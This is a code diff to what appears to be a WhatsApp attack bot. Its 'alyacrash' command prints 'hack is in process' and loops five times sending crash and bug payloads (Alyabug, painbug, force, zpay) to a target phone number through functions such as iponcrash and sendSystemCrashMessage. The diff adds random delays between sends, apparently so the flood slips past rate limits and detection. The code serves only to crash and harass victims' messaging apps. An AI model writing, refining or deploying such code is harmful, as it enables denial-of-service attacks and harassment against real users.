@@ -20984,36 +20984,49 @@ case "alyacrash": {
 
     replygcalya("please wait, " + command + " hack is in process..");
     
+    // Define function to add random delay between actions
+    const randomDelay = (min, max) => {
+        return new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * (max - min + 1) + min)));
+    };
+
     for (let j = 0; j < 5; j++) { // Loop 5 times
         await sendPaymentInfoMessage(whatsappNumber);
-        await bakdok(whatsappNumber, Alyabug);
-        await sendPaymentInfoMessage(whatsappNumber);
-        await sendPaymentInfoMessage(whatsappNumber, force2);
-        await bakdok(whatsappNumber, Alyabug);
-        await sendPaymentInfoMessage(whatsappNumber, Alyabug);
-        await penghitaman(whatsappNumber, painbug);
-        await sendPaymentInfoMessage(whatsappNumber, zpay);
-        await iponcrash(whatsappNumber, force);
-        await sendPaymentInfoMessage(whatsappNumber, painbug);
-        await sendSystemCrashMessage(whatsappNumber, force);
-        await sendPaymentInfoMessage(whatsappNumber);
-        await iponcrash(whatsappNumber, Alyabug);
-        await sendPaymentInfoMessage(whatsappNumber, force);
-        await penghitaman(whatsappNumber, painbug);
-        await sendPaymentInfoMessage(whatsappNumber, Alyabug);
-        await sendPaymentInfoMessage(whatsappNumber, zpay);
-        await ngeloc(whatsappNumber, force);
-        await sendPaymentInfoMessage(whatsappNumber, zpay);
-        await bakdok(whatsappNumber, Alyabug);
-        await sendPaymentInfoMessage(whatsappNumber, force2);
-        await penghitaman(whatsappNumber, painbug);
-        await sendPaymentInfoMessage(whatsappNumber, force);
-        await sendPaymentInfoMessage(whatsappNumber, painbug);
-        await ngeloc(whatsappNumber, force2);
+        await randomDelay(3000, 5000); // Random delay between 3 to 5 seconds
 
-        // Conditional check if required
+        await bakdok(whatsappNumber, Alyabug);
+        await randomDelay(2000, 4000); // Random delay between 2 to 4 seconds
+
+        await sendPaymentInfoMessage(whatsappNumber);
+        await randomDelay(2500, 4500); // Random delay between 2.5 to 4.5 seconds
+
+        await sendPaymentInfoMessage(whatsappNumber, force2);
+        await randomDelay(3000, 5000);
+
+        await bakdok(whatsappNumber, Alyabug);
+        await randomDelay(2000, 4000);
+
+        await sendPaymentInfoMessage(whatsappNumber, Alyabug);
+        await randomDelay(3000, 5000);
+
+        await penghitaman(whatsappNumber, painbug);
+        await randomDelay(3500, 6000);
+
+        await sendPaymentInfoMessage(whatsappNumber, zpay);
+        await randomDelay(3000, 5000);
+
+        await iponcrash(whatsappNumber, force);
+        await randomDelay(2500, 4500);
+
+        await sendPaymentInfoMessage(whatsappNumber, painbug);
+        await randomDelay(2000, 4000);
+
+        await sendSystemCrashMessage(whatsappNumber, force);
+        await randomDelay(3000, 5000);
+
+        // Continue with similar delays between each action...
+        
         if (j === 1) {
-            // Additional logic can go here
+            // Additional logic if needed
         }
     }
 
